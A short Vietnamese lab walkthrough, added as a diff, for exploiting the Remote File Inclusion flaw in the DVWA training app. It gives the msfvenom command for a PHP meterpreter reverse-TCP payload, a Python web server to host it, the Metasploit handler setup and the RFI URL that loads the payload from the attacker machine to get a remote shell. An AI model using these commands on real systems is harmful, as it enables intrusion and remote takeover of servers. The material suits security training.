@@ -1,0 +1,21 @@
+Cài đặt và khởi động chương trình XAMPP + DVWA trên máy chủ Windows 7
+
+Lỗ hổng RFI nằm tại uri: http://localhost/dvwa/vulnerabilities/fi/?page=http://google.com
+
+Tiến hành download php_reverse_shell hoặc sử dụng msfvenom để tạo payload php khai thác:
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.27.160 LPORT=4444 >> exploit.php
+
+Khởi động máy chủ web bằng python với câu lệnh:
+cd /var/www/html
+python -m SimpleHTTPServer 80
+
+msfconsole
+use exploit/multi/handler
+set LHOST 192.168.27.160
+set LPORT 4444
+set payload php/meterpreter/reverse_tcp
+exploit
+
+Truy cập đến file exploit.php đang hosting ở máy Kali Linux để khai thác RCE hệ thống.
+http://localhost/dvwa/vulnerabilities/fi/?page=http://192.168.27.160/exploit.php
